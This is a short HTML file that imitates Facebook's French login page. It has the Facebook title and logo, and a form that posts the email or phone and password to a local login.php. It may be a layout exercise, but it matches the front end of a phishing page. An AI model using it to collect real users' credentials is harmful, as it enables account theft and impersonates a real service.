<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Connexion</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <!-- Logo Facebook -->
        <img src="facebook-logo.png" alt="Facebook" class="logo">

        <!-- Formulaire -->
        <form action="login.php" method="POST" class="login-form">
            <input type="text" name="username" placeholder="Adresse e-mail ou numéro de telephone" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit" class="login-btn">Se connecter</button>
        </form>

        <a href="#" class="forgot-link">Mot de passe oublié ?</a>
        <hr>
        <button class="create-btn">Créer nouveau compte</button>
    </div>
</body>
</html>
